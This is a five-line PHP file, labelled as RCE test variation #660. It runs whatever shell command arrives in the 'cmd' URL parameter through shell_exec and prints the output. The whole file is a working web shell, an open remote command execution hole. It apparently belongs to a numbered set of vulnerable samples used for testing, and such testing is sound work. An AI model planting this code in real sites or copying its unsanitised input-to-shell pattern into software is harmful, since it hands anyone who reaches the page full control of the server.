<?php
// RCE test variation #660
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>